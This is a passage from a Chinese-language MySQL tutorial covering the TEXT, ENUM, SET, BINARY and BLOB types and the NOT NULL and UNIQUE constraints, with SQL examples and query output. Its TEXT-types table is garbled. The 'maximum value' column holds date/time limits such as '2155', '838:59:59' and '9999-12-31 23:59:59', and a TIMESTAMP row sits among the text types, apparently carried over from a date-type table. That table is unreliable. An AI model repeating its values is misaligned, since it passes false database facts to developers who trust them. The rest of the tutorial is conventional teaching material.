<li>MyISAM &#x6700;&#x597D;&#x4F7F;&#x7528;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x5217;&#x4EE3;&#x66FF;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x5217;</li>
<li>MEMORY &#x76EE;&#x524D;&#x90FD;&#x4F7F;&#x7528;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x884C;&#x5B58;&#x50A8;</li>
<li>InnoDB &#x5EFA;&#x8BAE;&#x4F7F;&#x7528; <code>varchar</code> &#x7C7B;&#x578B;&#x3002;</li>
</ul>
</li>
</ul>
<p>&#x5BF9;&#x4E8E; InnoDB &#x6570;&#x636E;&#x8868;&#xFF0C;&#x5176;&#x5185;&#x90E8;&#x7684;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x5E76;&#x6CA1;&#x6709;&#x533A;&#x5206;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x548C;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x5217;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x884C;&#x90FD;&#x4F7F;&#x7528;&#x5934;&#x6307;&#x9488;&#x6307;&#x5411;&#x6570;&#x636E;&#x5217;&#xFF0C;&#x4E3B;&#x8981;&#x5F71;&#x54CD;&#x5176;&#x6027;&#x80FD;&#x662F;&#x6570;&#x636E;&#x884C;&#x4F7F;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x603B;&#x91CF;&#x3002;</p>
<p><code>TEXT</code> &#x7528;&#x4E8E;&#x4FDD;&#x5B58;&#x6587;&#x672C;&#x7C7B;&#x578B;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x9884;&#x5148;&#x5B9A;&#x4E49;&#x957F;&#x5EA6;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x505A;&#x4E3B;&#x952E;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6587;&#x672C;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x7279;&#x70B9;</th>
<th style="text-align:center">&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x957F;&#x5EA6;&#x8303;&#x56F4;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;</th>
<th style="text-align:center">&#x6700;&#x5927;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">TINYTEXT</td>
<td style="text-align:center">&#x5C0F;&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 255</td>
<td style="text-align:center">L + 2 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">2155</td>
</tr>
<tr>
<td style="text-align:center">TEXT</td>
<td style="text-align:center">&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 65535</td>
<td style="text-align:center">L + 2 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">838:59:59</td>
</tr>
<tr>
<td style="text-align:center">MEDIUMTEXT</td>
<td style="text-align:center">&#x4E2D;&#x7B49;&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 16777215</td>
<td style="text-align:center">L + 3 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">9999-12-03</td>
</tr>
<tr>
<td style="text-align:center">LONGTEXT</td>
<td style="text-align:center">&#x5927;&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L&lt;= 4294967295&#xFF08;&#x76F8;&#x5F53;&#x4E8E;4GB&#xFF09;</td>
<td style="text-align:center">L + 4 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">9999-12-31 23:59:59</td>
</tr>
<tr>
<td style="text-align:center">TIMESTAMP</td>
<td style="text-align:center">&#x65E5;&#x671F;&#x65F6;&#x95F4;</td>
<td style="text-align:center">4</td>
<td style="text-align:center">YYYY-MM-DD HH:MM:SS</td>
<td style="text-align:center">1970-01-01 00:00:00 UTC</td>
<td style="text-align:center">2038-01-19 03:14:07UTC</td>
</tr>
</tbody>
</table>
<p><code>TEXT</code> &#x6587;&#x672C;&#x7C7B;&#x578B;&#x9002;&#x5408;&#x5B58;&#x50A8;&#x8F83;&#x5927;&#x7684;&#x6587;&#x672C;&#x6BB5;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C;&#x3002;</p>
<p><code>TEXT</code> &#x548C; <code>BLOB</code> &#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x5728;&#x5220;&#x9664;&#x540E;&#x5BB9;&#x6613;&#x5BFC;&#x81F4;&#x7A7A;&#x6D1E;&#xFF08;&#x6587;&#x4EF6;&#x788E;&#x7247;&#x591A;&#xFF09;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x9891;&#x7E41;&#x4F7F;&#x7528;&#x7684;&#x8868;&#x4E0D;&#x5EFA;&#x8BAE;&#x5305;&#x542B; <code>TEXT</code> &#x7C7B;&#x578B;&#x5B57;&#x6BB5;&#xFF0C;&#x5EFA;&#x8BAE;&#x5206;&#x8868;&#x5B58;&#x50A8;&#x3002;</p>
<p>&#x679A;&#x4E3E;&#x7C7B;&#x578B; <code>ENUM</code> &#x7684;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x9700;&#x8981;&#x5728;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;&#x65F6;&#x6307;&#x5B9A;&#x3002;</p>
<p><code>ENUM</code> &#x7C7B;&#x578B;&#x53EA;&#x5141;&#x8BB8;&#x4ECE;&#x5DF2;&#x6709;&#x7684;&#x6210;&#x5458;&#x4E2D;&#x9009;&#x53D6;&#x5355;&#x4E2A;&#x503C;&#xFF0C;&#x4E14;&#x4E00;&#x6B21;&#x4E0D;&#x80FD;&#x9009;&#x53D6;&#x591A;&#x4E2A;&#x503C;&#x3002;</p>
<p>&#x5176;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x7531;&#x5B9A;&#x4E49; <code>ENUM</code> &#x7C7B;&#x578B;&#x65F6;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x6210;&#x5458;&#x4E2A;&#x6570;&#x51B3;&#x5B9A;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6587;&#x672C;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x957F;&#x5EA6;&#x8303;&#x56F4;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ENUM</td>
<td style="text-align:center">L</td>
<td style="text-align:center">1 &lt;= L &lt;= 65535</td>
<td style="text-align:center">1&#x6216;2&#x4E2A;&#x5B57;&#x8282;</td>
</tr>
</tbody>
</table>
<p><code>ENUM</code> &#x6240;&#x9700;&#x8981;&#x7684;&#x5B57;&#x8282;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF1A;</p>
<ul>
<li>1&#xFF5E;255 &#x4E2A;&#x6210;&#x5458;&#x9700;&#x8981; 1 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;</li>
<li>256&#xFF5E;65535 &#x4E2A;&#x6210;&#x5458;&#x9700;&#x8981; 2 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;</li>
<li>&#x4E0A;&#x9650;&#x6700;&#x591A;&#x4E3A; 65535 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;</li>
</ul>
<p><code>SET</code> &#x8868;&#x793A;&#x5B57;&#x7B26;&#x4E32;&#x5BF9;&#x8C61;&#xFF0C;&#x53EF;&#x4EE5;&#x5305;&#x542B; 0 &#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x6210;&#x5458;&#xFF0C;&#x4E0A;&#x9650;&#x4E3A; 64&#x3002;</p>
<p><code>SET</code> &#x7C7B;&#x578B;&#x6240;&#x5360;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x53D6;&#x51B3;&#x4E8E;&#x5305;&#x542B;&#x6210;&#x5458;&#x7684;&#x4E2A;&#x6570;&#x3002;&#x4E0E; <code>ENUM</code> &#x4E0D;&#x540C;&#xFF0C;<code>SET</code> &#x5728;&#x9009;&#x53D6;&#x6210;&#x5458;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x9009;&#x62E9;&#x591A;&#x4E2A;&#x6210;&#x5458;&#x3002;&#x5BF9; <code>SET</code> &#x63D2;&#x5165;&#x91CD;&#x590D;&#x7684;&#x6210;&#x5458;&#x65F6;&#xFF0C;&#x91CD;&#x590D;&#x7684;&#x6210;&#x5458;&#x4F1A;&#x88AB;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x3002;</p>
<h3 id="%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B">&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</h3>
<p><code>BINARY</code> &#x548C; <code>VARBINARY</code> &#x7C7B;&#x4F3C;&#x4E8E; <code>CHAR</code> &#x548C; <code>VARCHAR</code>&#xFF0C;&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
<p><code>BINARY(M)</code> &#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;<code>M</code> &#x8868;&#x793A;&#x6700;&#x591A;&#x80FD;&#x5B58;&#x50A8;&#x7684;&#x5B57;&#x8282;&#x6570;&#x3002;</p>
<p>&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32; <code>VARBINARY(M)</code> &#x4E2D;&#xFF0C;<code>M</code> &#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#xFF08;&#x5B58;&#x50A8;&#x4E0A;&#x9650;&#xFF09;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x7279;&#x70B9;</th>
<th style="text-align:center">&#x503C;&#x7684;&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7A7A;&#x95F4;(&#x5B57;&#x8282;)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">BINARY(M)</td>
<td style="text-align:center">&#x56FA;&#x5B9A;&#x957F;&#x5EA6;</td>
<td style="text-align:center">M &#xFF08;0 &lt;= M &lt;= 255&#xFF09;</td>
<td style="text-align:center">M&#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">VARBINARY(M)</td>
<td style="text-align:center">&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">M&#xFF08;0 &lt;= M &lt;= 65535&#xFF09;</td>
<td style="text-align:center">M+1&#x4E2A;&#x5B57;&#x8282;</td>
</tr>
</tbody>
</table>
<p><code>BLOB</code> &#x7C7B;&#x578B;&#x9002;&#x5408;&#x5B58;&#x50A8;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#x5927;&#x5BF9;&#x8C61;&#xFF0C;&#x5E38;&#x7528;&#x4E8E;&#x56FE;&#x7247;&#x3001;&#x97F3;&#x9891;&#x548C;&#x89C6;&#x9891;&#x7B49;&#x3002;</p>
<p>&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x4E2D;&#x5F80;&#x5F80;&#x4E0D;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x76F4;&#x63A5;&#x5B58;&#x50A8;&#x8F83;&#x5927;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x662F;&#x5C06;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7684;&#x78C1;&#x76D8;&#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x7684;&#x8BBF;&#x95EE;&#x8DEF;&#x5F84;&#x5B58;&#x50A8;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x503C;&#x7684;&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x957F;&#x5EA6;&#x8303;&#x56F4;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7A7A;&#x95F4;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">TINYBLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 255</td>
<td style="text-align:center">L + 1 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">BLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 65535&#xFF08;&#x76F8;&#x5F53;&#x4E8E;64KB&#xFF09;</td>
<td style="text-align:center">L + 2 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">MEDIUMBLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 16777215 &#xFF08;&#x76F8;&#x5F53;&#x4E8E;16MB&#xFF09;</td>
<td style="text-align:center">L + 3 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
<tr>
<td style="text-align:center">LONGBLOB</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 4294967295&#xFF08;&#x76F8;&#x5F53;&#x4E8E;4GB&#xFF09;</td>
<td style="text-align:center">L + 4 &#x4E2A;&#x5B57;&#x8282;</td>
</tr>
</tbody>
</table>
<p>&#x5BF9; <code>TEXT</code> &#x548C; <code>BLOB</code> &#x6267;&#x884C;&#x5220;&#x9664;&#x6216;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5728;&#x8868;&#x4E2D;&#x7559;&#x4E0B;&#x7A7A;&#x6D1E;&#x3002;&#x5EFA;&#x8BAE;&#x5B9A;&#x671F;&#x4F7F;&#x7528; <code>OPTIMIZE TABLE</code> &#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x788E;&#x7247;&#x6574;&#x7406;&#x3002;</p>
<p>&#x5728;&#x5F00;&#x53D1;&#x4E2D;&#x6700;&#x597D;&#x5C06;&#x8FD9;&#x7C7B;&#x6570;&#x636E;&#x5206;&#x8868;&#x7BA1;&#x7406;&#xFF0C;&#x51CF;&#x5C11;&#x4E3B;&#x8868;&#x4E2D;&#x7684;&#x788E;&#x7247;&#xFF0C;&#x4FDD;&#x6301;&#x4F4F;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x6570;&#x636E;&#x884C;&#x7684;&#x6027;&#x80FD;&#x4F18;&#x52BF;&#xFF0C;&#x907F;&#x514D;&#x5927;&#x91CF;&#x7684;&#x503C;&#x4F20;&#x8F93;&#x3002;</p>
<blockquote>
<p>&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x300A;Java&#x5F00;&#x53D1;&#x624B;&#x518C;&#x300B;&#x4E4B; MySQL &#x6570;&#x636E;&#x5E93;&#xFF1A;</p>
<ul>
<li>&#x4EFB;&#x4F55;&#x5B57;&#x6BB5;&#x5982;&#x679C;&#x4E3A;&#x975E;&#x8D1F;&#x6570;&#xFF0C;&#x5FC5;&#x987B;&#x662F; <code>UNSIGNED</code>
<ul>
<li>&#x3010;&#x5F3A;&#x5236;&#x3011;&#x5C0F;&#x6570;&#x7C7B;&#x578B;&#x4E3A; <code>DECIMAL</code>&#xFF0C;&#x7981;&#x6B62;&#x4F7F;&#x7528; <code>FLOAT</code> &#x548C; <code>DOUBLE</code>&#x3002;
<ul>
<li>&#x8BF4;&#x660E;&#xFF1A;&#x5728;&#x5B58;&#x50A8;&#x7684;&#x65F6;&#x5019;&#xFF0C;<code>FLOAT</code> &#x548C; <code>DOUBLE</code> &#x90FD;&#x5B58;&#x5728;&#x7CBE;&#x5EA6;&#x635F;&#x5931;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5F88;&#x53EF;&#x80FD;&#x5728;&#x6BD4;&#x8F83;&#x503C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F97;&#x5230;&#x4E0D;&#x6B63;&#x786E;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x8303;&#x56F4;&#x8D85;&#x8FC7; <code>DECIMAL</code> &#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5EFA;&#x8BAE;&#x5C06;&#x6570;&#x636E;&#x62C6;&#x6210;&#x6574;&#x6570;&#x548C;&#x5C0F;&#x6570;&#x5E76;&#x5206;&#x5F00;&#x5B58;&#x50A8;&#x3002;</li>
</ul>
</li>
<li>&#x3010;&#x5F3A;&#x5236;&#x3011;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x51E0;&#x4E4E;&#x76F8;&#x7B49;&#xFF0C;&#x4F7F;&#x7528; <code>CHAR</code> &#x5B9A;&#x957F;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x3002;</li>
<li>&#x3010;&#x5F3A;&#x5236;&#x3011;<code>VARCHAR</code> &#x662F;&#x53EF;&#x53D8;&#x957F;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E0D;&#x9884;&#x5148;&#x5206;&#x914D;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C;&#x957F;&#x5EA6;&#x4E0D;&#x8981;&#x8D85;&#x8FC7; 5000&#x3002;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x957F;&#x5EA6;&#x5927;&#x4E8E;&#x6B64;&#x503C;&#xFF0C;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x4E3A; <code>TEXT</code>&#xFF0C;&#x72EC;&#x7ACB;&#x51FA;&#x6765;&#x4E00;&#x5F20;&#x8868;&#xFF0C;&#x7528;&#x4E3B;&#x952E;&#x6765;&#x5BF9;&#x5E94;&#xFF0C;&#x907F;&#x514D;&#x5F71;&#x54CD;&#x5176;&#x5B83;&#x5B57;&#x6BB5;&#x7D22;&#x5F15;&#x6548;&#x7387;&#x3002;</li>
</ul>
</li>
</ul>
</blockquote>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BA%A6%E6%9D%9F">&#x7EA6;&#x675F;</h2>
<p>&#x7EA6;&#x675F;&#x5373;&#x5BF9;&#x8868;&#x4E2D;&#x5B57;&#x6BB5;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x3002;&#x5B8C;&#x6574;&#x6027;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5B9E;&#x4F53;&#x5B8C;&#x6574;&#x6027;&#x3001;&#x57DF;&#x5B8C;&#x6574;&#x6027;&#x3001;&#x5F15;&#x7528;&#x5B8C;&#x6574;&#x6027;&#x4EE5;&#x53CA;&#x81EA;&#x5B9A;&#x4E49;&#x5B8C;&#x6574;&#x6027;&#x3002;</p>
<blockquote>
<p>information_schema &#x7CFB;&#x7EDF;&#x5E93;&#xFF1B;table_constraints &#x4E13;&#x95E8;&#x5B58;&#x50A8;&#x5404;&#x4E2A;&#x8868;&#x7684;&#x7EA6;&#x675F;&#x7684;&#x8868;</p>
</blockquote>
<pre><code class="language-sql"># &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x8868;&#x5DF2;&#x6709;&#x7684;&#x7EA6;&#x675F;
SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;&#x8868;&#x540D;&#x79F0;&apos;;
</code></pre>
<h3 id="not-null-constraint">NOT NULL Constraint</h3>
<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5217;&#x53EF;&#x4EE5;&#x5305;&#x542B; <code>NULL</code> &#x503C;&#x3002;</p>
<p>&#x7A7A;&#x5B57;&#x7B26;&#x4E32; <code>&apos; &apos;</code> &#x4E0D;&#x7B49;&#x4E8E; <code>NULL</code>&#xFF0C;0 &#x4E5F;&#x4E0D;&#x7B49;&#x4E8E; <code>NULL</code>&#x3002;</p>
<p>&#x975E;&#x7A7A;&#x7EA6;&#x675F;&#x5F3A;&#x5236;&#x5217;&#x4E0D;&#x63A5;&#x53D7; <code>NULL</code> &#x503C;&#x3002;</p>
<pre><code class="language-sql"># &#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x975E;&#x7A7A;&#x7EA6;&#x675F;
CREATE TABLE &#x8868;&#x540D;&#x79F0;(...,&#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B; NOT NULL,...);
</code></pre>
<pre><code class="language-sql"># &#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x975E;&#x7A7A;&#x7EA6;&#x675F;
ALTER TABLE &#x8868;&#x540D;&#x79F0; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B; NOT NULL;
</code></pre>
<pre><code class="language-sql"># &#x5220;&#x9664;&#x975E;&#x7A7A;&#x7EA6;&#x675F;
ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B; NULL;
ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B;;
</code></pre>
<h3 id="unique-constraint">UNIQUE Constraint</h3>
<p>&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x53EF;&#x4EE5;&#x786E;&#x4FDD;&#x5217;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x503C;&#x90FD;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x3002;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F;&#x5141;&#x8BB8;&#x5217;&#x503C;&#x4E3A; <code>NULL</code>&#x3002;</p>
<p>&#x6BCF;&#x4E2A;&#x8868;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A; UNIQUE &#x7EA6;&#x675F;&#xFF0C;&#x4F46;&#x6BCF;&#x4E2A;&#x8868;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A; PRIMARY KEY &#x7EA6;&#x675F;&#x3002;</p>
<p>&#x5F53;&#x521B;&#x5EFA;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x65F6;&#x672A;&#x7ED9;&#x4E00;&#x7EA6;&#x675F;&#x547D;&#x540D;&#xFF0C;&#x90A3;&#x4E48;&#x9ED8;&#x8BA4;&#x548C;&#x5217;&#x540D;&#x76F8;&#x540C;&#x3002;</p>
<pre><code class="language-sql"># &#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F;
CREATE TABLE test2(id INT UNIQUE,last_name VARCHAR(15),email VARCHAR(25),salary DECIMAL(10,2),CONSTRAINT uni_test2_email UNIQUE(email));
DESC test2;
+-----------+---------------+------+-----+---------+-------+
| Field     | Type          | Null | Key | Default | Extra |
+-----------+---------------+------+-----+---------+-------+
| id        | int           | YES  | UNI | NULL    |       |
| last_name | varchar(15)   | YES  |     | NULL    |       |
| email     | varchar(25)   | YES  | UNI | NULL    |       |
| salary    | decimal(10,2) | YES  |     | NULL    |       |
+-----------+---------------+------+-----+---------+-------+
SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;test2&apos;;
+--------------------+-------------------+-----------------+--------------+------------+-----------------+----------+
| CONSTRAINT_CATALOG | CONSTRAINT_SCHEMA | CONSTRAINT_NAME | TABLE_SCHEMA | TABLE_NAME | CONSTRAINT_TYPE | ENFORCED |
+--------------------+-------------------+-----------------+--------------+------------+-----------------+----------+
| def                | dbtest13          | id              | dbtest13     | test2      | UNIQUE          | YES      |
| def                | dbtest13          | uni_test2_email | dbtest13     | test2      | UNIQUE          | YES      |
+--------------------+-------------------+-----------------+--------------+------------+-----------------+----------+
</code></pre>
<pre><code class="language-sql"># &#x53EF;&#x4EE5;&#x5411; unique &#x6807;&#x8BC6;&#x7684;&#x5B57;&#x6BB5;&#x6DFB;&#x52A0; null &#x503C;
INSERT INTO test2 (id,last_name,email,salary) VALUES (2,&apos;gz&apos;,NULL,99998);
INSERT INTO test2 (id,last_name,email,salary) VALUES (3,&apos;hz&apos;,NULL,99997);
</code></pre>
<pre><code class="language-sql"># &#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x7EA6;&#x675F;
ALTER TABLE &#x8868;&#x540D; ADD UNIQUE key(&#x5B57;&#x6BB5;&#x5217;&#x8868;);
ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x5B57;&#x6BB5;&#x7C7B;&#x578B; UNIQUE;
</code></pre>
<pre><code class="language-sql"># &#x82E5;&#x5DF2;&#x5B58;&#x5728;&#x5217;&#x4E2D;&#x6570;&#x636E;&#x76F8;&#x7B49;&#x7684;&#x60C5;&#x51B5; =&gt; &#x9700;&#x8981;&#x4FEE;&#x6539;&#x540E;&#x624D;&#x53EF;&#x8BBE;&#x7F6E;
mysql&gt; ALTER TABLE test2 ADD CONSTRAINT uni_test2_sal UNIQUE (salary);
mysql&gt; ALTER TABLE test2 MODIFY last_name VARCHAR(15) UNIQUE;
</code></pre>
<pre><code class="language-sql"># &#x590D;&#x5408;&#x7684;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F; + &#x8868;&#x7EA7;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE USER(id INT,`name` VARCHAR(15), `password` VARCHAR(25), CONSTRAINT uni_user_name_pwd UNIQUE (`name`,`password`));
mysql&gt; INSERT INTO USER VALUES (1, &apos;zs&apos;, &apos;abc&apos;);
# &#x590D;&#x5408;&#x7EA6;&#x675F;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x6709;&#x533A;&#x522B;&#x5373;&#x53EF;
mysql&gt; INSERT INTO USER VALUES (1, &apos;zscopy&apos;, &apos;abc&apos;);
</code></pre>
<p>&#x6DFB;&#x52A0;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x7684;&#x5217;&#x4E0A;&#x4F1A;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x3002;&#x5220;&#x9664;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x5220;&#x9664;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x5220;&#x9664;&#x65F6;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x540D;&#xFF08;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x540D;&#x548C;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x540D;&#x76F8;&#x540C;&#xFF09;&#x3002;</p>
<p>&#x521B;&#x5EFA;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x65F6;&#x672A;&#x6307;&#x5B9A;&#x540D;&#x79F0;&#xFF1A;</p>
<ul>
<li>&#x5355;&#x5217;&#x9ED8;&#x8BA4;&#x548C;&#x5217;&#x540D;&#x76F8;&#x540C;</li>
<li>&#x7EC4;&#x5408;&#x5217;&#x9ED8;&#x8BA4;&#x548C;&#x62EC;&#x53F7;&#x4E2D;&#x7684;&#x9996;&#x4E2A;&#x5217;&#x540D;&#x76F8;&#x540C;</li>
<li>&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x540D;</li>
</ul>
<pre><code class="language-sql">mysql&gt; ALTER TABLE test2 DROP INDEX last_name;
mysql&gt; ALTER TABLE test2 DROP INDEX uni_test2_sal;
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;test2&apos;;
mysql&gt; DESC test2;
</code></pre>
